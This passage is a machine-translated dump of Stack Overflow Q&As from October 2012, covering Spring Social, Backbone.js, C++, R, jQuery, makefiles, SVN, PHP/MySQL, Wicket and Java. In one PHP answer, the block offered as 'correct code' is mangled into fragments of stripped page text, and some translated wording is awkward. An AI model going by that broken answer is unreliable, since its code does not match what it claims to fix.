    JdbcUsersConnectionRepository repository = new JdbcUsersConnectionRepository(
        dataSource, connectionFactoryLocator(), Encryptors.noOpText());
    repository.setConnectionSignUp(new AccountConnectionSignUp(accountRepository));
    return repository;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T16:42:46.273

好的，我自己发现了：

```
<bean id="usersConnectionRepository"
        class="org.springframework.social.connect.jdbc.JdbcUsersConnectionRepository">
        <constructor-arg ref="jpaDataSource" />
        <constructor-arg ref="connectionFactoryLocator" />
        <constructor-arg ref="textEncryptor" />
        <property name="connectionSignUp" ref="accountConnectionSignUp" />
    </bean>

    <bean id="accountConnectionSignUp" class="path to AccountConnectionSignUp" /> 
```

这是为了任何人的帮助。谢谢！

# javascript - 在 Backbone.js 中仅保存更改的属性

> ID：13125838
> 
> 赞同：2
> 
> 时间：2012-10-29T16:35:40.487
> 
> 标签：javascript, backbone.js

我试图通过执行以下操作仅保存模型的更改属性：

```
 this.model.set("likes", this.model.get("likes") + 1);
        this.model.save(); 
```

并像这样扩展 Backbone 原型：

```
var backbone_common_extension = {
    sync: function(method,model,options) {
        options.contentType = 'application/json';
        if (method == 'update') {
            options.data = JSON.stringify(model.changedAttributes() || {});
        }
        console.log(options.data);
        Backbone.sync.call(this, method, model, options);
    }
};

_.extend(Backbone.Model.prototype, backbone_common_extension); 
```

问题是 model.changedAttributes() 总是空的。我试过在 set 方法上传递 {silent: true} ，但同样的事情。如何防止骨干在同步之前清除 changedAttributes()？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-29T18:15:21.193

依靠`changedAttributes`这种东西往往不能很好地工作，Backbone 并没有真正定义好的设置/提交/保存/回滚系统，所以你会发现`changedAttributes`当你不期望它时它会被清空。

幸运的是，没关系；你不走运，没关系，因为你的整个方法都是错误的。如果你从服务器加载你的模型，然后从其他浏览器进来五个喜欢，会发生什么？您的方法会覆盖所有喜欢的内容，并且数据会丢失。

您应该让服务器管理喜欢的总数，并且您的模型应该简单地发送一点“还有一个喜欢”的消息，并让服务器以新的总数响应。我会更像这样：

```
// On the appropriate model...
add_like: function() {
    var _this = this;
    $.ajax({
        type: 'post',
        url: '/some/url/that/increments/the/likes',
        success: function(data) {
            _this.set('likes', data.likes);
        },
        error: function() {
            // Whatever you need...
        }
    });
} 
```

然后`/some/url/...`服务器上的处理程序将向其数据库发送一个简单的“加一”更新，并发回更新后的点赞数。这让数据库负责管理数据和并发问题；数据库擅长这类事情，客户端 JavaScript 则不然。

# c++ - 从您嵌套迭代的列表中删除

> ID：13125841
> 
> 赞同：0
> 
> 时间：2012-10-29T16:35:44.433
> 
> 标签：c++, stl, iterator

假设您正在使用这样的嵌套 for 循环遍历列表：

```
 for( list<Object>::iterator iter = list.begin() ; iter != list.end() ; ++iter )
  {
    for( list<Object>::iterator iter2 = list.begin() ; iter2 != list.end() ; ++iter2 )
    {
      if( iter != iter2 )
      {
        if( some other condition )
        { 
          iter2 = list.erase( iter2 ) ; 
          // uh oh! what about iter?
        }
      }
    }
  } 
```

怎么保养`iter`？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-29T16:44:38.230

[list:erase 仅使指向被擦除项目的迭代器无效](http://www.cplusplus.com/reference/stl/list/erase/)。由于`iter`不等于`iter2`，你应该没问题。

# java - 设计模式 - 具有通用和特殊属性的类

> ID：13125845
> 
> 赞同：3
> 
> 时间：2012-10-29T16:35:52.043
> 
> 标签：java, design-patterns, object-oriented-analysis

我正在尝试查看是否有可以解决此问题的设计模式：

我创建了一个具有属性 a、b 和 c 的抽象类 A。我有另一个 B 类，它扩展了 A 类并添加了更多属性：x、y、z。然后我有另一个类 C，它再次扩展 A 并添加 i、j、k。最后，我有一个工厂方法来确定创建 B 或 C 的实例，这就是我需要帮助的部分。这个工厂方法应该如何或返回什么：如果它返回一个 A 的实例，我就不知道创建了哪个特定实例 B 或 C？我需要这个工厂方法来创建一个具体的实例。现在，我知道我可以编写像 createB 或 createC 这样的静态方法，但我正在寻找更通用的解决方案，也许是另一种设计模式。

**更新**：我想知道具体类的原因是我需要将此对象传递给前端 jsp。该 JSP 需要知道实例化了哪个特定类，以便它可以调用适当的 getter。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T16:59:14.830

我会保持应有的**工厂模式**。所以返回类型将是 Abstract A 类。B&C 也应该通过[**Proxy Pattern**](http://en.wikipedia.org/wiki/Proxy_pattern)继承它们的属性。

因此，制作 CAble 和 BAble 接口并将 C 和 B 用作 A 的实例（因为它们都是由同一个工厂生成的），然后将 B 和 C 转换为它们的接口描述。

干杯!

更新：

我想我已经知道您需要什么，请想象以下内容：在学校页面中。有一个学生和教授的一般视图，都有共同的和个人的领域，但共同的要求是*schoolMember*。

```
class SchoolMember // The return type of your Factory
  -name
  +getView():SchoolMemberView // Will be used by the View//View Model

Interface Professor
  getProfession()
Interface Student
  getSemester() 

class FacultyMamber: SchoolMember,Professor
  -profession
  +getView():SchoolMemberView
class UniStudent: SchoolMember,Student
  -semmester
  +getView():SchoolMemberView 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T16:49:30.097

我建议一个[`Builder pattern`](http://en.wikipedia.org/wiki/Builder_pattern)会根据设置为 Builder 的专用字段知道要构建的对象。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-29T16:39:39.780

根据您的描述，B 和 C 与 A 没有任何共同之处。您已经提到每个类都有特定的属性，但没有关于它们的共同点/它们之间的关系。如果您的类之间没有关系，则不应使用继承。

但是，如果存在您在问题中没有提到的共同关系，那么[工厂方法模式](http://en.wikipedia.org/wiki/Factory_method_pattern)可能就是您要寻找的。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-29T16:39:51.283

阅读问题时唯一想到的是抽象工厂模式：

[http://en.wikipedia.org/wiki/Abstract_factory_pattern](http://en.wikipedia.org/wiki/Abstract_factory_pattern)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-29T16:41:14.440

工厂方法应该返回一个A的实例。如果你想知道具体的对象是B还是C，你可以使用instanceof操作符，也就是反射模式。理想情况下，您不需要知道自己是 B 还是 C；该逻辑都应该由 A 中的方法的多态性来处理。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-10-29T16:42:22.187

**正是工厂模式描述中提到的警告点。**

当你设计一个应用程序时，想想你是否真的需要一个工厂来创建对象。也许使用它会给您的应用程序带来不必要的复杂性。无论如何，如果您有许多相同基本类型的对象并且您主要将它们作为抽象对象进行操作，那么您需要一个工厂。我你的代码应该有很多类似下面的代码，**重新考虑一下**。

```
if (genericProduct typeof ConcreteProduct)
    ((ConcreteProduct)genericProduct).doSomeConcreteOperation(); 
```

来源：[http ://www.oodesign.com/factory-method-pattern.html](http://www.oodesign.com/factory-method-pattern.html)

# r - 按行拆分 R 中的数据帧

> ID：13125846
> 
> 赞同：15
> 
> 时间：2012-10-29T16:35:55.077
> 
> 标签：r

我有一个像这样的长数据框：

```
 Row  Conc   group
  1     2.5    A
  2     3.0    A
  3     4.6    B
  4     5.0    B
  5     3.2    C
  6     4.2    C
  7     5.3    D
  8     3.4    D 
```

...

实际数据有数百行。我想将 A 拆分为 C 和 D。我在网上查找并找到了几种解决方案，但不适用于我的情况。

[如何拆分数据框？](https://stackoverflow.com/questions/3302356/r-language-how-to-split-a-data-frame)

例如：案例一：

```
x = data.frame(num = 1:26, let = letters, LET = LETTERS)
set.seed(10)
split(x, sample(rep(1:2, 13))) 
```

我不想被任意数字分割

案例 2：按级别/因子拆分

```
data2 <- data[data$sum_points == 2500, ] 
```

我也不想被一个因素分开。有时我想将许多级别组合在一起。

案例3：按行号选择

```
newdf <- mydf[1:3,] 
```

实际数据有数百行。我不知道行号。我只知道我想拆分的级别。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-10-29T16:41:57.133

听起来你想要两个数据框，一个`(A,B,C)`在其中，一个只有`D`. 在那种情况下，你可以做

```
Data1 <- subset(Data, group %in% c("A","B","C"))
Data2 <- subset(Data, group=="D") 
```

如果您要问不同的问题，请纠正我

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2019-03-11T09:43:52.907

对于那些一次又一次地通过互联网搜索引擎来到这里的人，标题中问题的答案是：

```
x <- data.frame(num = 1:26, let = letters, LET = LETTERS)

split(x, sort(as.numeric(rownames(x)))) 
```

假设您的数据框具有按数字顺序排列的行名称。也`split(x, rownames(x))`可以，但结果会重新排列。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-29T17:17:11.637

您可以考虑使用`recode()`“car”包中的功能。

```
# Load the library and make up some sample data
library(car)
set.seed(1)
dat <- data.frame(Row = 1:100,
                  Conc = runif(100, 0, 10),
                  group = sample(LETTERS[1:10], 100, replace = TRUE)) 
```

目前，`dat$group`包含大写字母 A 到 J。假设我们需要以下四个组：

*   “一” = A、B、C
*   “二” = D、E、J
*   “三”= F，我
*   “四” = G, H

现在，使用`recode()`（注意分号和嵌套引号）。

```
recodes <- recode(dat$group, 
                 'c("A", "B", "C") = "one"; 
                  c("D", "E", "J") = "two"; 
                  c("F", "I") = "three"; 
                  c("G", "H") = "four"')
split(dat, recodes) 
```

# objective-c - 没有 C++ 的 AudioQueue *Recording* 示例？

> ID：13125855
> 
> 赞同：1
> 
> 时间：2012-10-29T16:36:23.573
> 
> 标签：objective-c, ios

出于难以理解的原因，由于音频队列服务是纯 c 包装器，因此录制的唯一示例 SpeakHere：

1.  是一个非常大且有趣的工作应用程序，例如需要解析很多内容
2.  包括 .cpp 文件，甚至一些 .mm 文件。对于只偶尔使用纯 C 的 obj-C 程序员来说，这是一个很大的障碍。

通过不使用 C++ 的简单示例，是否有任何使用 AudioQueueServices 的示例，尤其是录制？

# jquery - 使用 jQuery 滑块 UI 更改类

> ID：13125860
> 
> 赞同：2
> 
> 时间：2012-10-29T16:36:44.257
> 
> 标签：jquery, css, user-interface, slider, range

我想使用 jQuery 滑块 UI 来更改单独元素上的类。

例如，滑块将有 10 个步骤，并且对于每个步骤，将有一个相应的类应用于目标元素。

例如：

当滑块在位置 2 时，元素的类为“.step-two” 当滑块在位置 6 时，元素的类为“.step-six”

我还希望在用户移动滑块时更改类，而不仅仅是在发布时。这可能吗？

```
 $('#slider').slider({
    value:0,
    min: 0,
    max: 110,
    step: 11,

    slide: function(event,ui){

        if (ui.value<0) { 
            $('#object').addClass('step-one');
        } else if (ui.value<10) { 
             $('#object' ).addClass('step-two');

        }
    }
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T16:44:25.150

这里有一些关于如何做的帮助，为什么你会想要这个超出我的范围：

```
$("#slider").slider({
    min: 1,
    max: 10,
    step: 1,
    range: false,
    slide: function(event, ui) {
        $("#someotherElement").removeClass().addClass('step_'+ui.value); //adds class step_1 -> step_10 etc
    }
});​ 
```

或者，如果您必须使用“一”、“二”等，请使用数组：

```
var array = ['one','two','three','four','five','six'....etc]

$("#slider").slider({
    min: 0,
    max: 10,
    step: 1,
    range: false,
    slide: function(event, ui) {
        $("#someotherElement").removeClass().addClass('step_'+array[ui.value]);
    }
});​ 
```

[**小提琴**](http://jsfiddle.net/4CW7z/1/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T16:44:15.557

是的，我能想到的一种方法是：

```
$( "#slider" ).slider({
    value:1,
    min: 1,
    max: 10,
    slide: function( event, ui ) {
        $("#someElementID").removeClass("step-" + (ui.value - 1) + " step-" + (ui.value + 1)).addClass("step-" + ui.value);
    }
}); 
```

另一个是：[prolly better way here]

```
var araClasses = new Array("step-one", "step-two", "step-three", "step-four", "step-five", "step-six", "step-seven", "step-eight", "step-nine", "step-ten");

$( "#slider" ).slider({
    value:0,
    min: 0,
    max: 9,
    change: function( event, ui ) { // change event is fired no matter how the slider is changed
        //  First remove all step classes
        for (x in araClasses) { $("#someElementID").removeClass(araClasses[x]) };
        // then add the relavant one
        $("#someElementID").addClass(araClasses[ui.value]);
    }
}); 
```

# javascript - 图片加载问题

> ID：13125862
> 
> 赞同：1
> 
> 时间：2012-10-29T16:36:48.070
> 
> 标签：javascript, onload

我正在创建一个大页面，其中包含很多包含大背景图像的块，所以我认为最好的办法是显示预加载器并在后台加载图像并更新加载器（20 中的图像 4，ecc）。我的问题是：当 onload 事件触发我的加载器时，我的加载器消失但我仍然看到图像加载，这意味着它没有完全加载。为什么会这样？任何想法？

这是页面：

[http://zhereicome.com/experiments/statics/myascensor/#1-1](http://zhereicome.com/experiments/statics/myascensor/#1-1)

提前致谢

```
nImages = $('.slide').length;
loadedImgs = 0;
var bgImages = ['img/bbb.png','img/bbb2.png','img/bbb3.png'];

$('.slide').each(function(i){
    var curSlide = $(this);
    var img = new Image();
    img.src = bgImages[ i % 3 ];
    img.onLoad = imageLoaded(img, curSlide);
})    

function imageLoaded(img, curSlide){
    curSlide.css('backgroundImage', 'url(' + img.src + ')');
    loadedImgs++;
    if(nImages == loadedImgs){
        $('#container').css('visibility','visible');
        $('#loader-cont').fadeOut(1000);
    }
    $('.loader-inner .title').text(loadedImgs / nImages);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T18:04:26.927

您似乎在使用 window.onload 和 document.ready 时遇到了一些问题：

```
$(document).ready(function(){
// This will be executed when the DOM is ready.
});

$(window).load(function(){
// This will be executed when the whole document and all its 
// referenced items (style sheets, scripts, images, etc.) are loaded.
}); 
```

但这之前已经被问过并且回答得更好：[如何使用 jQuery 创建“请稍候，正在加载...”动画？](https://stackoverflow.com/questions/1964839/jquery-please-wait-loading-animation)

# makefile - Makefile：将二进制文件、源文件和头文件拆分到目录中

> ID：13125864
> 
> 赞同：0
> 
> 时间：2012-10-29T16:36:50.560
> 
> 标签：makefile

这是我第一次尝试创建一个编译文件。我正在做一个项目，我想在编译下划分文件，所以我有 3 个文件夹：src、bin 和 header。今天我用命令 gcc file1.c file2.c file3.c -lncurses 编译

我怎样才能编写一个makefile来实现这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T18:03:51.803

这将做到：

```
bin/myBinaryName: file1.c file2.c file3.c
    gcc $^ -Iheader -lncurses -o $@

vpath %.c src 
```

还有比这更复杂的方法，但我怀疑你和过去几周提出非常相似问题的其他新人正在学习相同的课程。

如果您想要更基本的介绍，或更复杂的 makefile，您可以尝试不同的问题。

**编辑：**

让我们尝试一些更简单的东西。编写这个makefile（并命名`makefile`）：

```
all:
    echo hello world 
```

请注意，“echo”之前的空格是一个制表符。`make`现在在命令行上尝试。怎么了？

# svn - Subversion：保存工作副本状态

> ID：13125867
> 
> 赞同：1
> 
> 时间：2012-10-29T16:36:56.727
> 
> 标签：svn, save, backup

想象一下，我们有一个包含这些文件的存储库“my_repository”：

*   my_repository/file01（修订版 105）
*   my_repository/file02（修订版 110）
*   my_repository/file03（修订版 125）
*   my_repository/folder01/file01（修订版 100）
*   等等……等等……

我想保存这个状态。因此，如果我执行 svn update my_repository，我可以轻松地以所有不同的文件状态备份到我以前的状态。

可能吗 ？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T17:54:37.797

*   忘记 CVS 和文件级版本控制
*   欢迎来到 Subversion World，我们在这里使用**GLOBAL REPOSITORY-WIDE REVISIONS**
*   使用“last-change-of-file”修订作为*信息*数据，而不是*操作*数据。因为您必须对存储库树的任何部分的存储库**修订进行操作**
*   每组存储的更改（*提交*）都会向存储库添加新的*修订*，修订将*存储库*的更改历史记录**为整体对象**，每个修订都是树的冻结切片。

为你树（定义部分）

```
my_repository/file01 (revision 105)
my_repository/file02 (revision 110)
my_repository/file03 (revision 125)
my_repository/folder01/file01 (revision 100) 
```

您将在以后使用、记住和操作`my_repository@125`URL（公共路径，最新修订版），以及何时以及如果您想要返回到这个状态，您将在修订版 125 和下面树中的所有对象中使用`svn up`您的工作副本`my_repository/`root 将出现与最初完全相同的状态。

正如 phasetwenty 所写，您可以使用标签，这些标签只是用于在纯数字历史中轻松记忆和定位的文本标签

**最后说明** 我**强烈建议**你**阅读和理解**关于 Subversion 基础、基本概念、原则和意识形态的 SVN 书

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-29T17:07:11.560

任何值得关注的版本控制系统的核心功能之一是能够对项目的修订进行[分支。](http://svnbook.red-bean.com/en/1.7/svn.branchmerge.whatis.html)

同样相关的是创建[标签](http://svnbook.red-bean.com/en/1.7/svn.branchmerge.tags.html)的概念。这可能更符合您的需求。如果您想对该修订进行单独更改，您将需要一个分支。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-29T16:40:26.063

听起来你需要新的分支。

# php - 创建第二个表并添加数据

> ID：13125872
> 
> 赞同：0
> 
> 时间：2012-10-29T16:37:02.377
> 
> 标签：php, mysql

我从学校接到了这个任务，我对如何做到这一点感到困惑和迷茫。所以基本上我必须为数据库创建 2 个表，但我必须从 php 创建。

我创建了第一个表，但由于某种原因没有创建第二个。然后，我必须分别用 10 和 20 条样本记录填充第一个和第二个表，填充，这是否意味着添加更多的假用户？如果是这样，它像下面显示的代码吗？

*我在填充的第二部分也有错误

十分感谢你的帮助。

```
<?php
        $host = "host";
        $user = "me";
        $pswd = "password";
        $dbnm = "db";

        $conn = @mysqli_connect($host, $user, $pswd, $dbnm);
        if (!$conn)
            die ("<p>Couldn't connect to the server!<p>");

        $selectData = @mysqli_select_db ($conn, $dbnm);
        if(!$selectData)
        {
            die ("<p>Database Not Selected</p>");
        }

        //1st table
            $sql =  "CREATE TABLE IF NOT EXISTS  `friends`  
          (  
          `friend_id` INT NOT NULL auto_increment,   
          `friend_email` VARCHAR(20) NOT NULL,  
          `password` VARCHAR(20) NOT NULL,  
          `profile_name` VARCHAR(30) NOT NULL,  
          `date_started` DATE NOT NULL,  
          `num_of_friends` INT unsigned,  
          PRIMARY KEY (`friend_id`)  
          )";

        //2nd table
          $sqlMyfriends = "CREATE TABLE `myfriends`
          (  
          `friend_id1` INT NOT NULL,   
          `friend_id2` INT NOT NULL,
          )";

        $query_result1 = @mysqli_query($conn, $sql);
        $query_result2 = @mysqli_query($conn, $sqlMyfriends);

        //populating 1st table
        $sqlSt3="INSERT INTO friends (friend_id, friend_email, password, profile_name, date_started, num_of_friends) 
                VALUES('NULL','email@email.com','123','abc','2012-10-25', 5)";
        $queryResult3 = @mysqli_query($dbConnect,$sqlSt3)

        //populating 2nd table
        $sqlSt13="INSERT INTO myfriends VALUES(1,2)";
        $queryResult13=@mysqli_query($dbConnect,$sqlSt13);

        mysqli_close($conn);

    ?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T16:39:47.390

您在这里有一个额外的逗号，可能会导致错误：

`friend_id2`INT 非空，

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T16:40:31.720

应该：

```
 $sqlMyfriends = "CREATE TABLE `myfriends` (  
  `friend_id1` INT NOT NULL,   
  `friend_id2` INT NOT NULL
  )"; 
```

我希望我现在可以在学校:)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-29T16:58:29.380

其他人已经解决了您的一个问题，因此这与无法向您的表中添加值（填充）有关。您的连接链接是`$conn`-

```
$conn = @mysqli_connect($host, $user, $pswd, $dbnm);
ie.
   $query_result1 = @mysqli_query($conn, $sql); 
```

但是当您将值添加到表中时，您将连接链接更改为`$dbConnect`

```
...
$queryResult3 = @mysqli_query($dbConnect,$sqlSt3)
...
$queryResult13=@mysqli_query($dbConnect,$sqlSt13); 
```

* * *

要将多个值插入表中，您可以添加逗号和附加括号`,()`-

```
 //populating 2nd table
    $sqlSt13="INSERT INTO myfriends VALUES(1,2),(2,3),(3,1)";
    $queryResult13=@mysqli_query($conn,$sqlSt13); 
```

或者您可以使用`mysqli_multi_query`, 并列出每个 -

```
 //populating 2nd table
    $sqlSt13  ="INSERT INTO myfriends VALUES (1,2);";
    $sqlSt13 .="INSERT INTO myfriends VALUES (2,3);";
    $sqlSt13 .="INSERT INTO myfriends VALUES (3,1);";
    $queryResult13=@mysqli_query($conn,$sqlSt13); 
```

请参阅手册`mysqli_multi_query`- [php.net/manual/en/mysqli.multi-query.php](http://us2.php.net/manual/en/mysqli.multi-query.php)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-29T19:35:18.940

您在代码中有以下错误： 1) $queryResult3 = @mysqli_query($dbConnect,$sqlSt3) 是正确的： $queryResult3 = @mysqli_query($dbConnect,$sqlSt3); 2) $sqlMyfriends = "创建表`myfriends` (
`friend_id1`INT NOT NULL,
`friend_id2`INT NOT NULL, )"; 正确： $sqlMyfriends = "CREATE TABLE `myfriends` (
`friend_id1`INT NOT NULL,
`friend_id2`INT NOT NULL)"; 3) $queryResult3 = @mysqli_query($conn,$sqlSt3); 是正确的： $queryResult3 = mysqli_query($conn,$sqlSt3);

正确的代码是：

无法连接到服务器！

"); $selectData = @mysqli_select_db ($conn, $dbnm); if(!$selectData) { 死 ("

未选择数据库

mysqli_close($conn); ?> mysqli_close($conn); ?>

我希望有所帮助！

# java - Wicket 链接重放攻击

> ID：13125885
> 
> 赞同：2
> 
> 时间：2012-10-29T16:38:01.033
> 
> 标签：java, exception, hyperlink, wicket, replay

我有一个由不同片段组成的 ListView，其中包含文本和链接（在另一个片段内）。根据列表视图模型的状态，链接是否可见。

为简单起见，假设链接是可见的，具体取决于 listview 模型的布尔字段，如果为 true 则可见，否则不可见。

起初链接是可见的，我复制链接位置（加密），我等待我的模型改变（即布尔为假），刷新页面后链接消失了。（正确的！）

如果我尝试在浏览器中返回 URL（之前复制的），我会收到一个 WicketRuntimeException，告诉我找不到此链接的侦听器。

为了更完整，链接位于片段内：

```
<wicket:fragment wicket:id="reservationRatingFragment">
    <li>
        <div>
            <img src="/img/good.png" />
        </div>
        <p>
            <a wicket:id="ratingGoodLink" href="#"> <wicket:message
                    key="messaging.reservation.rating.good" />
            </a>
        </p>
    </li>
</wicket:fragment> 
```

当我说不可见时，我的意思是将片段的标记容器设置为 .setVisible(false);

为什么会这样？我假设如果我想起一个不再可见的链接，框架应该跳过它并刷新我当前所在的页面（或将我重定向到基本页面）。

例如，如果我复制链接并更改 BasePage（例如转到主页），则在调用复制的 URL 时仍然会发生异常。

编辑：

在第一个片段中：

```
WebMarkupContainer msgRatingContainer = new WebMarkupContainer("messageRatingContainer") {
            private static final long serialVersionUID = 1L;

            @Override
            public void onConfigure() {
                setVisible(message.getType() == MessageType.RATING);
            }
        };

if (msgRatingContainer.isVisible()) {
            if (message.getType() == MessageType.RATING) {
                msgRatingContainer.add(new ReservationRatingFragment("messageRatingSection",
                        "reservationRatingFragment", this, item, message));
} 
```

嵌套片段（ReservationRatingFragment）：

```
public ReservationRatingFragment(String id, String markupId,MarkupContainer markupContainer, Item item, Message msg) {
        super(id, markupId, markupContainer, new Model<Message>(msg));
        /* Avoid render container */
        setRenderBodyOnly(true);

        /* Load button components */
        Link<Void> ratingGoodLink = new Link<Void>("ratingGoodLink"){
            private static final long serialVersionUID = 1L;

            @Override
            public void onClick() {
                processRating(ReservationEvaluationResult.GOOD);
            }   
        };
        add(ratingGoodLink);

        Link<Void> ratingBadLink = new Link<Void>("ratingBadLink"){
            private static final long serialVersionUID = 1L;
            @Override
            public void onClick() {
                processRating(ReservationEvaluationResult.BAD);
            }   
        };
        add(ratingBadLink);
    } 
```

两个片段的标记：

```
<wicket:fragment wicket:id="messageFragment">
    Some content...
    <!-- Here goes my fragment with link -->
    <ul wicket:id="messageRatingContainer">
        <div wicket:id="messageRatingSection"></div>
    </ul>

    <wicket:fragment wicket:id="reservationRatingFragment">
        <li><div>
                <img src="/img/messaging/good.png" />
            </div>
            <p>
                <a wicket:id="ratingGoodLink" href="#"> <wicket:message
                        key="messaging.reservation.rating.good" />
                </a>
            </p></li>
        <li><div>
                <img src="/img/messaging/bad.png" />
            </div>
            <p>
                <a wicket:id="ratingBadLink" href="#"> <wicket:message
                        key="messaging.reservation.rating.bad" />
                </a>
            </p></li>
    </wicket:fragment>
</wicket:fragment> 
```

已编辑： processRating 只执行对控制器的调用（处理后端的更改）。在控制器中，我检查重放攻击（如果已执行此操作），如果是，则抛出运行时异常，将用户引导至警告页面（您已对此消息进行评级）。事实是，在这种情况下，它没有达到这一点，因为链接不可用，它不会调用控制器并且它只是抛出 InvalidUrlException，因为链接不可见。

检票口版本：1.4.19

谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-29T23:38:35.233

您认为无效链接将被忽略或将您重定向到基本页面的假设是错误的。

这是为什么？

如果我们退后一步，当您单击链接时会发生什么？应用程序的状态发生变化。然而，只有当应用程序处于创建链接时的状态时，这样做才是安全的。如果未强制执行此规则，则您需要确保每个潜在的状态转换都是可接受的或明确标记为无效。在大多数系统中，如果不是不可能的话，这将是非常不切实际的。但忽视这一点不仅会带来安全风险，而且可能导致数据损坏。

最好将其视为乐观锁定的情况。（多半是因为是 :)） 创建链接时，会给出创建时内部状态的版本号。单击链接时，该版本号将与内部状态的当前版本进行比较。如果两者匹配，则链接被接受为有效，更新内部状态并增加其版本号。如果这两个数字不匹配，则链接被拒绝并抛出异常，因为无法忽略无效的状态转换尝试。

我不会解释如何绕过这个限制，因为它已经在另一个答案中被告知，我只是想回答“为什么”的问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-29T23:01:55.803

我不确定我是否理解您实施的确切原因。也就是说，我建议在加载目标页面时使用设置了 PageParameters 的 BookmarkablePageLink() 来执行您的 processRating() 方法。

添加您的链接组件：

```
 PageParameters ppGood = new PageParameters("0="+ReservationEvaluationResult.GOOD);
    PageParameters ppBad = new PageParameters("0="+ReservationEvaluationResult.BAD);
    add(new BookmarkablePageLink("ratingGoodLink", DestinationPage.class, ppGood));
    add(new BookmarkablePageLink("ratingBadLink", DestinationPage.class, ppBad)); 
```

然后在 DestinationPage 中创建一个新的构造函数：

```
public class DestinationPage extends WebPage {
    public DestinationPage(PageParameters param) {
        if(param.getString("0")!=null){
            String rating = param.getString("0");
            processRating(rating);
        }
     ... 
```

这将为您提供一个永久链接，并应允许您复制和粘贴 URL。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-30T16:13:14.463

我发现的唯一可行的解​​决方案是扩展 RequestCycle 并以这种方式覆盖 onRuntimeException 方法：

```
@Override
public Page onRuntimeException(Page page, RuntimeException e) {     
    if(e instanceof InvalidUrlException) {
        return new HomePage();
    } else {
        return super.onRuntimeException(page, e);
    }
} 
```

# java - 比较和创建数组，而无需单独向数组添加元素

> ID：13125886
> 
> 赞同：0
> 
> 时间：2012-10-29T16:38:01.463
> 
> 标签：java

我正在努力做到这一点，如果一个数组等于另一个数组，那么做一些事情。

像这样的东西：

```
ArrayList<String> array = new ArrayList<String>();
gridArray.add(string1);
gridArray.add(string2);
gridArray.add(string3);
gridArray.add(string4);

if (array == {a,b,c,d}) {
....
}
if (array == {e,f,g,h}) {
....
} 
```

string1 等都是变量，因此每次运行这段代码时都会有所不同。我想要实现的主要目标是不必将 a、b、c、d 等单独添加到数组中（例如“数组”），因为我将有很多具有不同 a 值的 if 语句， b,c,d 以及比 a,b,c,d 更多的值。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-29T16:39:44.027

如果您不想创建数组，这将更加冗长。简单的方法是：

```
if (array.equals(Arrays.asList(a, b, c, d)) {} 
```

如果您的数组列表[恰好包含 a、b、c 和 d（以相同的顺序），](http://docs.oracle.com/javase/7/docs/api/java/util/List.html#equals%28java.lang.Object%29)这将返回 true ：

> 如果两个列表以相同的顺序包含相同的元素，则它们被定义为相等。

如果您不关心订单，您也可以使用`containsAll`，但这需要额外的步骤：

```
List<String> target = Arrays.asList(a, b, c, d);
if (array.containsAll(target) && array.size() == target.size()) {} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T16:39:23.967

[`Arrays`](http://docs.oracle.com/javase/7/docs/api/java/util/Arrays.html)有你可以使用的静态[`equals()`](http://docs.oracle.com/javase/7/docs/api/java/util/Arrays.html#equals%28java.lang.Object%5B%5D,%20java.lang.Object%5B%5D%29)方法：

```
String[] array = {"a", "b", "c", "d"};
if (Arrays.equals(array, new String[]{"a","b","c","d"})) {
    System.out.println("Equal!");
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-29T16:42:38.783

或者您可以使用[Apache Common 的 ArrayUtils](http://commons.apache.org/lang/api-2.4/org/apache/commons/lang/ArrayUtils.html#isEquals%28java.lang.Object,%20java.lang.Object%29)比较功能：

```
 isEquals

public static boolean isEquals(java.lang.Object array1,
                               java.lang.Object array2)

    Compares two arrays, using equals(), handling multi-dimensional arrays correctly. 
```

# android - 在部分内容上滚动RelativeLayout-白色边框

> ID：13125895
> 
> 赞同：1
> 
> 时间：2012-10-29T16:38:54.543
> 
> 标签：android, android-layout

我有一个相当简单的片段，它将一些彩色 ImageViews 添加到 RelativeLayout。有更多的图像无法显示在屏幕上，所以我实现了一些自定义滚动。

但是，当我滚动时，我看到滚动之前屏幕边缘所在的内容右侧有一个大约 90dp 的白色边框重叠部分。很明显，ImageViews 仍在正确创建和绘制，但它们被掩盖了。

我该如何摆脱这个？

我试过了：

*   将 RelativeLayout 和 FrameLayout 都更改为 WRAP_CONTENT、FILL_PARENT、MATCH_PARENT 以及它们的一些组合。
*   将两个布局的内边距和边距设置为 0dp。

例子：
![](../Images/06138b727855cee6515dde15c4acc2d0.png)

分段：

```
public class MyFrag extends Fragment implements OnTouchListener {
    int currentX;
    int currentY;
    RelativeLayout container;
    final int[] colors = {Color.BLACK, Color.RED, Color.BLUE};

     @Override
     public View onCreateView(LayoutInflater inflater, ViewGroup fragContainer, Bundle savedInstanceState) {
         return inflater.inflate(R.layout.fragment_myfrag, null);
     }

     @Override
